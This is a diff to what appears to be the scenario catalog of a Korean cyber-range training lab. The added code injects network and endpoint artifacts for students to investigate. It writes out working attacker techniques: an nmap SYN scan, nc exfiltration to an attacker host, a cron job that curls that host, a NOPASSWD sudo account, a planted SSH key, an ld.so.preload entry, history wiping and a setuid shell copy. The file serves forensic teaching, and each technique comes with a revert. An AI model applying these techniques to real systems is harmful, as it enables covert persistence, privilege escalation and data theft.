@@ -69,6 +69,13 @@ async def sh_bg(c: str, script: str, h: str):
 #
 # 그래서 /proc 를 직접 훑고 셸 빌트인 kill 로 죽인다. 자기 PID 는 건너뛴다.
 # 죽인 개수를 돌려주므로 호출부가 '정말 정리됐는지' 확인할 수 있다.
+#
+#   ③ **case 패턴에 공백이 들어가면 dash 가 통째로 문법 오류를 낸다.**
+#      `case $cl in *curl -s -m*)` → "Syntax error: word unexpected".
+#      패턴 목록이 하나라도 어긋나면 case 문 전체가 죽으므로 핸들 표식까지
+#      함께 무력화된다. 즉 원복이 **아무것도 죽이지 않고 성공을 보고**했다.
+#      2026-08-13 실측: 원복 경로 10곳 중 8곳이 이 상태였다(공백 포함 패턴).
+#      그래서 아래 kill_bg 가 문자 부분을 따옴표로 감싸 넘긴다 — 별표는 밖에 둔다.
 KILL_SH = """n=0
 for d in /proc/[0-9]*; do
   pid=${d#/proc/}
@@ -82,11 +89,23 @@ echo "killed=$n" """
 
 
 async def kill_bg(c: str, h: str | None = None, *extra: str) -> int:
+    """표식으로 배경 프로세스를 죽이고 **죽인 개수**를 돌려준다.
+
+    패턴의 문자 부분은 반드시 따옴표로 감싼다(위 ③). 큰따옴표가 들어간 패턴은
+    감쌀 수 없으므로 아예 거절한다 — 조용히 통과시키면 또 같은 함정이다.
+    """
     pats = ([mark(h)] if h else []) + list(extra)
+    pats = [p for p in pats if p]
     if not pats:
         return 0
-    out = await dk.sh(c, KILL_SH % "|".join(f"*{p}*" for p in pats))
-    m = re.search(r"killed=(\d+)", out or "")
+    bad = [p for p in pats if '"' in p]
+    if bad:
+        raise ValueError(f"kill 패턴에 큰따옴표를 쓸 수 없다: {bad}")
+    out = await dk.sh(c, KILL_SH % "|".join(f'*"{p}"*' for p in pats))
+    if "Syntax error" in (out or "") or "killed=" not in (out or ""):
+        # 조용히 0 을 돌려주면 원복 실패가 성공으로 보고된다. 그게 원래 버그였다.
+        raise RuntimeError(f"정리 스크립트가 실행되지 않았다: {out!r}")
+    m = re.search(r"killed=(\d+)", out)
     return int(m.group(1)) if m else 0
 
 
@@ -414,12 +433,20 @@ reg(id="net_portblock", domain="network", name="포트 차단", danger=2, kind="
 #   주입하면 진짜 탐지 이벤트가 SIEM 에 쌓인다. 시뮬레이션이 아니다.
 # ══════════════════════════════════════════════════════════════════
 WEB = "10.20.30.1"                                  # fw 의 ext 진입점
+WEB_DMZ = "10.20.32.80"                             # dmz 의 web(ModSec) 실주소
 
 reg(id="sec_portscan", domain="security", name="포트 스캔", danger=1, kind="action",
-    desc="ext 존에서 SYN 스캔을 돌린다. Suricata 가 잡는다.",
-    teaches="정찰 단계의 흔적을 읽는 법. 스캔은 공격의 시작이지 결과가 아니다.",
+    desc="ext 존에서 dmz 웹으로 SYN 스캔을 돌린다. 체인을 통과하므로 Suricata 가 잡는다.",
+    teaches="정찰 단계의 흔적을 읽는 법. 스캔은 공격의 시작이지 결과가 아니다. "
+            "대상을 fw 의 ext 주소(10.20.30.1)로 바꿔서 돌려 보면 **아무것도 안 잡힌다** — "
+            "그 SYN 은 fw 에서 끝나고 ips 를 지나지 않기 때문이다. 탐지기는 지나가는 것만 본다.",
     scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
-    params=[{"name": "target", "label": "대상", "type": "str", "default": WEB},
+    # 기본 대상이 dmz 실주소인 이유(2026-08-13 실측):
+    #   10.20.30.1 로 1-1024 를 훑으면 DNAT 대상 포트(80/443)만 체인을 타고
+    #   나머지 1022 개는 fw 에서 끝난다. Suricata 의 임계(10초에 SYN 30개)를
+    #   못 채워 **경보가 하나도 안 뜬다.** 예전 기본값이 이거였다.
+    #   10.20.32.80 로 훑으면 전량이 fw→ips→dmz 를 지나 경보가 뜬다(출처 .202 보존).
+    params=[{"name": "target", "label": "대상", "type": "str", "default": WEB_DMZ},
             {"name": "ports", "label": "포트 범위", "type": "str", "default": "1-1024"}],
     apply=lambda t, p, h: sh_bg(t, f"nmap -sS -T4 -p {p.get('ports','1-1024')} "
                                    f"{p.get('target', WEB)}", h))
@@ -450,15 +477,52 @@ reg(id="sec_bruteforce", domain="security", name="무차별 대입", danger=1, k
                                    f"sshpass -p wrong$i ssh -o StrictHostKeyChecking=no "
                                    f"-o ConnectTimeout=2 admin@{p.get('target')} true; done", h))
 
-reg(id="sec_exfil", domain="security", name="대용량 외부 전송", danger=2, kind="action",
-    desc="ext 존에서 대용량 아웃바운드를 발생시킨다. 세션 크기가 Suricata 에 기록된다.",
+EXFIL_PORT = 4444
+
+
+async def _exfil(t, p, h):
+    """3F GPU 존에서 ext 로 대용량을 밀어낸다. **방향이 교보재다.**
+
+    예전 구현은 attacker 가 웹(8001)으로 200MB 를 밀어 넣는 것이었다. 전송 자체는
+    됐다 — 2026-08-13 실측에서 Suricata flow 에 233,196,286 B 로 남았다. 틀린 것은
+    **방향**이다. 유출은 안에서 밖으로 나간다. 밖에서 웹으로 올리는 것은 업로드고,
+    그걸로는 "이 아웃바운드가 백업인가 가중치 유출인가"를 물을 수 없다.
+
+    그래서 수신 측(attacker)에 먼저 싱크를 띄우고, gpu-gw 에서 흘려보낸다.
+    경로는 app(10.20.50) → ips → pipe → ext 라 **반드시 ips 를 지난다.**
+    초당 chunk MB 로 나눠 보내므로 흐름이 눈에 보이는 시간 동안 지속된다.
+
+    조사할 때 알아야 할 것: Suricata 의 flow 기록(=총 바이트)은 **세션이 끝나고
+    타임아웃이 지난 뒤에** 나온다. 실시간으로는 anomaly/패킷만 보이고 총량은 몇 분
+    뒤에 채워진다. 그래서 "지금 얼마나 나갔나"는 flow 로 못 본다 — 그걸 모르면
+    학생은 로그가 없다고 결론 내린다.
+    """
+    mb, chunk = int(p.get("mb", 200)), max(1, int(p.get("chunk", 20)))
+    port = int(p.get("port", EXFIL_PORT))
+    # 수신 싱크 — 받은 것은 버린다. 표식을 붙여 원복 때 같이 죽인다.
+    await sh_bg(ATTACKER, f"ncat -l -k -p {port} > /dev/null", h)
+    await asyncio.sleep(1.0)
+    await sh_bg(t, f"i=0; while [ $i -lt {mb} ]; do dd if=/dev/zero bs=1M count={chunk} "
+                   f"2>/dev/null; sleep 1; i=$((i+{chunk})); done "
+                   f"| nc -w 120 10.20.30.202 {port}", h)
+    return {"port": port, "mb": mb}
+
+
+async def _exfil_stop(t, pl):
+    n = await kill_bg(t, pl["_h"], "dd if=/dev/zero")
+    n += await kill_bg(ATTACKER, pl["_h"], "ncat -l -k")
+    return n
+
+
+reg(id="sec_exfil", domain="security", name="대용량 외부 반출", danger=2, kind="state",
+    desc="3F GPU 존에서 ext 로 대용량을 흘려보낸다. ips 를 지나므로 세션 크기가 Suricata flow 에 남는다.",
     teaches="AI데이터센터에서만 성립하는 판단 — 40GB 아웃바운드는 백업인가 **모델 가중치 유출**인가. "
             "끊으면 증거 수집이 끝난다는 것까지 판단해야 한다.",
-    scenarios=["SEC-01"], targets=[ATTACKER], ttl=0,
+    scenarios=["SEC-01"], targets=["kt66-gpu-gw"], ttl=900,
     params=[{"name": "mb", "label": "전송량(MB)", "type": "int", "default": 200},
-            {"name": "sink", "label": "수신지", "type": "str", "default": f"{WEB}:8001"}],
-    apply=lambda t, p, h: sh_bg(t, f"dd if=/dev/zero bs=1M count={int(p.get('mb', 200))} 2>/dev/null "
-                                   f"| ncat -w 20 {p.get('sink','').replace(':',' ')}", h))
+            {"name": "chunk", "label": "초당 MB", "type": "int", "default": 20},
+            {"name": "port", "label": "수신 포트", "type": "int", "default": EXFIL_PORT}],
+    apply=_exfil, revert=_exfil_stop)
 
 reg(id="sec_c2beacon", domain="security", name="C2 비컨", danger=1, kind="state",
     desc="일정 주기 + 흔들림으로 외부에 짧은 요청을 보낸다.",
@@ -613,11 +677,274 @@ reg(id="load_conn_exhaust", domain="load", name="커넥션 고갈", danger=2, ki
     revert=lambda t, pl: kill_bg(t, pl["_h"], "ncat -"))
 
 
+# ══════════════════════════════════════════════════════════════════
+# 엔드포인트 흔적 (8) — 조사할 것을 실제로 남긴다.
+#
+# 위의 security 계열이 **네트워크에 남는 흔적**(패킷·경보)이라면, 여기는
+# **호스트에 남는 흔적**이다. 둘은 다른 능력을 가르친다. 경보를 읽는 것과
+# 침해된 서버에 들어가 무엇이 바뀌었는지 찾아내는 것은 별개의 일이다.
+#
+# 설계 규칙 (앞의 원칙에 더해)
+#   ⓐ 흔적은 **진짜여야 한다.** 로그에 문장을 써넣는 것이 아니라 파일을 만들고
+#      계정을 만들고 프로세스를 띄운다. 학생이 찾는 방법이 실무와 같아야 한다.
+#   ⓑ 흔적마다 **찾는 길이 둘 이상** 있어야 한다. 하나만 있으면 그건 퀴즈지 조사가
+#      아니다. 파일 / 시각 / 로그 / 프로세스 중 최소 둘.
+#   ⓒ 원복은 흔적을 **완전히** 지운다. 다음 조가 앞 조의 침해를 물려받으면 안 된다.
+#   ⓓ 되돌릴 수 없는 파괴는 하지 않는다. 덮어쓰기 전에 반드시 스냅샷을 뜬다.
+#
+# 표식: 만든 것에는 전부 /var/tmp/kt66-ep-<handle>.manifest 를 남긴다. 원복은
+# 그 목록을 되짚는다 — 무엇을 만들었는지 기억에 의존하지 않는다.
+# ══════════════════════════════════════════════════════════════════
+EP_HOSTS = ["kt66-web", "kt66-fw", "kt66-ips"]          # wazuh 에이전트가 붙어 있는 곳
+EP_APP = ["kt66-dvwa", "kt66-web"]                      # 웹 문서 루트가 있는 곳
+
+# 공격자 흉내용 상수. 학생이 "왜 이 값이냐"를 물을 수 있게 일부러 뻔하게 둔다.
+EP_USER = "svc_backup"
+EP_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKt66LabForensicsTrainingKeyDoNotUse "
+          "backup@ext-backup-01")
+
+
+def _manifest(h: str) -> str:
+    return f"/var/tmp/kt66-ep-{h}.manifest"
+
+
+async def _ep_note(t: str, h: str, line: str):
+    """만든 것을 적어 둔다. 원복이 이 목록만 보고 되돌린다."""
+    await dk.sh(t, f"printf '%s\\n' {line!r} >> {_manifest(h)}")
+
+
+async def _webshell(t, p, h):
+    root = p.get("root") or ("/var/www/html" if t == "kt66-dvwa" else "/var/www/html")
+    name = p.get("name") or "sess_a7f3.php"
+    # 숨은 디렉터리 안에 둔다 — `ls` 로는 안 보이고 `find` 로만 나온다.
+    d = f"{root}/.uploads"
+    path = f"{d}/{name}"
+    await dk.sh(t, f"mkdir -p {d} && cat > {path} <<'EOF'\n"
+                   "<?php\n"
+                   "// kt66 훈련용 아티팩트 — 실제 실행 기능 없음. 흔적으로만 존재한다.\n"
+                   "if (isset($_REQUEST['c'])) { echo 'kt66-training-artifact'; }\n"
+                   "EOF\n"
+                   f"chmod 0644 {path}")
+    # 타임스톰핑: mtime 만 과거로 돌린다. ctime 은 못 돌린다 — 그 어긋남이 단서다.
+    if p.get("timestomp", True):
+        await dk.sh(t, f"touch -m -t 202401150312 {path}")
+    await _ep_note(t, h, path)
+    return {"path": path, "dir": d}
+
+
+reg(id="ep_webshell", domain="forensic", name="웹셸 투척(+타임스톰핑)", danger=2, kind="state",
+    desc="문서 루트의 숨은 디렉터리에 PHP 파일을 떨어뜨리고 mtime 을 과거로 돌린다.",
+    teaches="**mtime 은 위조되지만 ctime 은 안 된다.** 파일이 1월에 만들어졌다고 주장하는데 "
+            "ctime 이 오늘이면 그 주장 자체가 증거다. `stat` 로 셋을 다 봐야 하는 이유. "
+            "찾는 길: ① find -name '*.php' -newer ② stat 의 mtime/ctime 불일치 "
+            "③ WAF 접근 로그의 업로드 요청.",
+    scenarios=["SEC-02", "SEC-03"], targets=EP_APP, ttl=3600,
+    params=[{"name": "name", "label": "파일명", "type": "str", "default": "sess_a7f3.php"},
+            {"name": "root", "label": "문서 루트", "type": "str", "default": "/var/www/html"},
+            {"name": "timestomp", "label": "시각 위조", "type": "bool", "default": True}],
+    apply=_webshell,
+    revert=lambda t, pl: dk.sh(t, f"rm -rf {pl['dir']}; rm -f {_manifest(pl['_h'])}; true"))
+
+
+async def _rogue_account(t, p, h):
+    u = p.get("user") or EP_USER
+    # 스냅샷 먼저. 원칙 ⓓ.
+    await dk.sh(t, f"cp -f /etc/passwd /var/tmp/kt66-ep-{h}.passwd.bak; "
+                   f"cp -f /etc/shadow /var/tmp/kt66-ep-{h}.shadow.bak 2>/dev/null; true")
+    await dk.sh(t, f"useradd -m -s /bin/bash -c 'Backup Service' {u} 2>/dev/null || true; "
+                   f"printf '{u} ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/90-{u}; "
+                   f"chmod 0440 /etc/sudoers.d/90-{u}")
+    await _ep_note(t, h, f"user:{u}")
+    return {"user": u}
+
+
+reg(id="ep_rogue_account", domain="forensic", name="무단 계정 + sudo 권한", danger=3, kind="state",
+    desc="서비스 계정처럼 보이는 로컬 계정을 만들고 sudoers.d 에 무암호 권한을 넣는다.",
+    teaches="이름이 그럴듯하면 대장과 대조하기 전까지 아무도 의심하지 않는다. "
+            "**CMDB 에 없는 계정**이라는 사실이 유일한 단서인 경우가 많다. "
+            "찾는 길: ① /etc/passwd 의 마지막 줄과 UID 연속성 ② /etc/sudoers.d 목록 "
+            "③ Wazuh FIM(/etc 감시)의 파일 변경 경보.",
+    scenarios=["SEC-02", "AUD-01"], targets=EP_HOSTS, ttl=3600,
+    params=[{"name": "user", "label": "계정명", "type": "str", "default": EP_USER}],
+    apply=_rogue_account,
+    revert=lambda t, pl: dk.sh(t, f"userdel -r {pl['user']} 2>/dev/null; "
+                                  f"rm -f /etc/sudoers.d/90-{pl['user']}; "
+                                  f"cp -f /var/tmp/kt66-ep-{pl['_h']}.passwd.bak /etc/passwd 2>/dev/null; "
+                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))
+
+
+async def _ssh_key(t, p, h):
+    home = p.get("home") or "/home/ccc"
+    d, f = f"{home}/.ssh", f"{home}/.ssh/authorized_keys"
+    await dk.sh(t, f"mkdir -p {d} && cp -f {f} /var/tmp/kt66-ep-{h}.ak.bak 2>/dev/null; "
+                   f"printf '%s\\n' {EP_KEY!r} >> {f}; chmod 600 {f}")
+    await _ep_note(t, h, f)
+    return {"file": f}
+
+
+reg(id="ep_ssh_key", domain="forensic", name="SSH 공개키 심기", danger=3, kind="state",
+    desc="authorized_keys 에 외부 키 한 줄을 덧붙인다. 비밀번호를 바꿔도 들어올 수 있다.",
+    teaches="**비밀번호 변경으로 끝냈다고 생각하는 순간 놓친다.** 지속성은 인증정보가 아니라 "
+            "파일에 남는다. 찾는 길: ① authorized_keys 의 줄 수와 코멘트 필드 "
+            "② 파일 mtime 이 마지막 정상 변경보다 뒤 ③ Wazuh FIM(/home/ccc 실시간 감시).",
+    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
+    params=[{"name": "home", "label": "홈 디렉터리", "type": "str", "default": "/home/ccc"}],
+    apply=_ssh_key,
+    # 원본이 없던 경우(백업 실패)를 위한 그물. 대소문자가 섞인 base64 대신
+    # 코멘트 필드로 지운다 — 예전엔 base64 조각으로 지웠는데 대문자 하나가 달라
+    # 조용히 안 지워졌다. 지워지지 않은 키는 침해가 다음 조로 넘어간다는 뜻이다.
+    revert=lambda t, pl: dk.sh(t, f"cp -f /var/tmp/kt66-ep-{pl['_h']}.ak.bak {pl['file']} 2>/dev/null "
+                                  f"|| sed -i '/backup@ext-backup-01/d' {pl['file']}; "
+                                  f"sed -i '/backup@ext-backup-01/d' {pl['file']} 2>/dev/null; "
+                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))
+
+
+async def _cron_persist(t, p, h):
+    name = p.get("name") or "apt-compat"
+    path = f"/etc/cron.d/{name}"
+    await dk.sh(t, f"printf '%s\\n' '*/5 * * * * root /usr/bin/curl -s -m 5 "
+                   f"http://10.20.30.202:8000/u >/dev/null 2>&1' > {path}; chmod 0644 {path}")
+    await _ep_note(t, h, path)
+    return {"path": path}
+
+
+reg(id="ep_cron_persist", domain="forensic", name="cron 지속성", danger=3, kind="state",
+    desc="시스템 패키지처럼 보이는 이름으로 /etc/cron.d 에 주기 실행을 넣는다.",
+    teaches="지속성은 **눈에 띄지 않는 이름**을 쓴다. 'apt-compat' 은 진짜 같지만 대장에 없다. "
+            "찾는 길: ① /etc/cron.d 의 파일 mtime 정렬 ② 패키지 소유 확인(dpkg -S) — "
+            "패키지가 소유하지 않는 파일이 답이다 ③ 5분 주기 아웃바운드가 Suricata 에 남는다.",
+    scenarios=["SEC-01", "SEC-02"], targets=EP_HOSTS, ttl=3600,
+    params=[{"name": "name", "label": "파일명", "type": "str", "default": "apt-compat"}],
+    apply=_cron_persist,
+    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['path']} {_manifest(pl['_h'])}; true"))
+
+
+async def _hidden_dir(t, p, h):
+    d = p.get("dir") or "/dev/shm/.cache"
+    await dk.sh(t, f"mkdir -p {d}")
+    # 실제로 도는 프로세스를 남긴다 — 파일만 있으면 '이미 끝난 일'로 보인다.
+    await sh_bg(t, f"cd {d} && while :; do sleep 30; done", h)
+    await _ep_note(t, h, d)
+    return {"dir": d}
+
+
+async def _hidden_dir_stop(t, pl):
+    # 프로세스를 먼저 죽인다. 디렉터리만 지우면 cwd 를 잃은 채 계속 돌아
+    # 다음 조의 ps 에 유령으로 남는다.
+    n = await kill_bg(t, pl["_h"])
+    await dk.sh(t, f"rm -rf {pl['dir']} {_manifest(pl['_h'])}; true")
+    return n
+
+
+reg(id="ep_hidden_dir", domain="forensic", name="은닉 작업 디렉터리 + 상주 프로세스", danger=2,
+    kind="state",
+    desc="/dev/shm 아래 점(.)으로 시작하는 디렉터리를 만들고 그 안에서 프로세스를 상주시킨다.",
+    teaches="/dev/shm 은 **디스크가 아니라 메모리**다. 재부팅하면 사라지고, 디스크 이미지를 "
+            "떠도 안 나온다. 살아 있는 동안에만 잡을 수 있다 — 그래서 전원을 내리는 판단이 "
+            "증거를 없앨 수 있다. 찾는 길: ① ls -a /dev/shm ② ps 의 작업 디렉터리 "
+            "(/proc/<pid>/cwd) ③ 마운트 목록에서 tmpfs 사용량.",
+    scenarios=["SEC-02"], targets=EP_HOSTS + ["kt66-dvwa"], ttl=3600,
+    params=[{"name": "dir", "label": "경로", "type": "str", "default": "/dev/shm/.cache"}],
+    apply=_hidden_dir, revert=_hidden_dir_stop)
+
+
+async def _preload(t, p, h):
+    await dk.sh(t, f"cp -f /etc/ld.so.preload /var/tmp/kt66-ep-{h}.preload.bak 2>/dev/null; "
+                   f"printf '/usr/local/lib/libsysaudit.so\\n' > /etc/ld.so.preload")
+    # 파일 자체는 만들지 않는다. 존재하지 않는 라이브러리를 가리키게 두면 로더가
+    # 조용히 무시하므로 컨테이너가 망가지지 않는다 — 흔적은 남고 서비스는 산다.
+    await _ep_note(t, h, "/etc/ld.so.preload")
+    return {}
+
+
+reg(id="ep_preload", domain="forensic", name="ld.so.preload 지속성", danger=3, kind="state",
+    desc="/etc/ld.so.preload 에 항목을 넣는다. 파일 자체는 없어 서비스는 정상 동작한다.",
+    teaches="이 파일은 **평소에 존재하지 않는다.** 존재한다는 사실만으로 조사 대상이다. "
+            "'무엇이 이상한가'가 아니라 '**없어야 할 것이 있는가**'로 보는 훈련. "
+            "찾는 길: ① 파일 존재 여부 ② 가리키는 라이브러리가 패키지 소유인가 "
+            "③ 기준 이미지와의 차이(docker diff).",
+    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
+    apply=_preload,
+    revert=lambda t, pl: dk.sh(t, f"cp -f /var/tmp/kt66-ep-{pl['_h']}.preload.bak /etc/ld.so.preload "
+                                  f"2>/dev/null || rm -f /etc/ld.so.preload; "
+                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))
+
+
+async def _history_wipe(t, p, h):
+    home = p.get("home") or "/home/ccc"
+    f = f"{home}/.bash_history"
+    await dk.sh(t, f"cp -f {f} /var/tmp/kt66-ep-{h}.hist.bak 2>/dev/null; "
+                   f": > {f} 2>/dev/null; ln -sf /dev/null {f} 2>/dev/null; true")
+    await _ep_note(t, h, f)
+    return {"file": f, "home": home}
+
+
+reg(id="ep_history_wipe", domain="forensic", name="명령 이력 지우기", danger=2, kind="state",
+    desc="bash_history 를 비우고 /dev/null 로 심볼릭 링크를 걸어 다시 쌓이지 않게 한다.",
+    teaches="**지운 것이 증거다.** 이력이 비어 있는데 로그인 기록은 있다면 그 간극이 사건이다. "
+            "찾는 길: ① ls -l 로 심볼릭 링크 확인(파일이 아니다) ② last/lastlog 의 로그인 "
+            "기록과 대조 ③ Wazuh 의 cmdlog(kt66 은 /var/log/kt66-cmd.log 를 따로 수집한다).",
+    scenarios=["AUD-01", "SEC-02"], targets=EP_HOSTS, ttl=3600,
+    params=[{"name": "home", "label": "홈 디렉터리", "type": "str", "default": "/home/ccc"}],
+    apply=_history_wipe,
+    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['file']}; "
+                                  f"cp -f /var/tmp/kt66-ep-{pl['_h']}.hist.bak {pl['file']} 2>/dev/null "
+                                  f"|| : > {pl['file']}; rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))
+
+
+async def _setuid_drop(t, p, h):
+    d = p.get("dir") or "/var/tmp"
+    path = f"{d}/.systemd-private"
+    await dk.sh(t, f"cp -f /bin/dash {path} 2>/dev/null || cp -f /bin/sh {path}; "
+                   f"chmod 4755 {path}")
+    await _ep_note(t, h, path)
+    return {"path": path}
+
+
+reg(id="ep_setuid_drop", domain="forensic", name="setuid 셸 사본", danger=3, kind="state",
+    desc="셸을 복사해 setuid 비트를 세운다. 계정 없이도 권한을 되찾는 고전적 뒷문이다.",
+    teaches="계정을 지우고 키를 지워도 이게 남아 있으면 **권한은 회복된다.** 그래서 대응은 "
+            "'무엇을 지웠는가'가 아니라 '**무엇이 남았는가**'로 끝나야 한다. "
+            "찾는 길: ① find / -perm -4000 -newer <기준파일> ② 표준 setuid 목록과 비교 "
+            "③ 이름이 systemd 를 흉내내지만 /var/tmp 에 있다는 위치 자체의 이상.",
+    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
+    apply=_setuid_drop,
+    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['path']} {_manifest(pl['_h'])}; true"))
+
+
+async def _waf_bypass_trace(t, p, h):
+    """WAF 를 지나온 것처럼 보이는 접근 기록을 **실제 요청으로** 만든다.
+
+    로그에 줄을 써넣지 않는다 — 그러면 학생이 상관분석을 해도 앞뒤가 안 맞는다.
+    attacker 에서 진짜 요청을 보내서 fw→ips→web 전 구간에 같은 사건이 남게 한다.
+    """
+    path = p.get("path") or "/.uploads/sess_a7f3.php?c=id"
+    n = int(p.get("count", 6))
+    await dk.sh(ATTACKER, f"for i in $(seq 1 {n}); do "
+                          f"curl -s -m 5 -A 'Mozilla/5.0 (X11; Linux x86_64)' "
+                          f"'http://10.20.30.1:8002{path}' >/dev/null; sleep 2; done")
+    return {"path": path}
+
+
+reg(id="ep_webshell_access", domain="forensic", name="웹셸 접근 흔적(실요청)", danger=1,
+    kind="action",
+    desc="투척된 경로로 실제 HTTP 요청을 보낸다. WAF·IPS·앱 로그에 같은 사건이 남는다.",
+    teaches="**한 사건이 세 곳에 다르게 남는다.** 시각·출처·경로를 맞춰 보는 것이 상관분석이다. "
+            "ep_webshell 과 짝으로 쓴다 — 파일만 있고 접근 기록이 없으면 '언제 심겼나'를 "
+            "좁힐 수 없다.",
+    scenarios=["SEC-03"], targets=EP_APP, ttl=0,
+    params=[{"name": "path", "label": "경로", "type": "str",
+             "default": "/.uploads/sess_a7f3.php?c=id"},
+            {"name": "count", "label": "요청 수", "type": "int", "default": 6}],
+    apply=_waf_bypass_trace)
+
+
 BY_ID = {i.id: i for i in C}
 DOMAINS = {
     "system":   {"name": "시스템 · 프로세스", "color": "#38bdf8"},
     "storage":  {"name": "스토리지 · 디스크", "color": "#fbbf24"},
     "network":  {"name": "네트워크",          "color": "#a78bfa"},
     "security": {"name": "보안",              "color": "#ff4d6a"},
+    "forensic": {"name": "엔드포인트 흔적",   "color": "#f472b6"},
     "load":     {"name": "부하 · 성능",       "color": "#3ddc97"},
 }
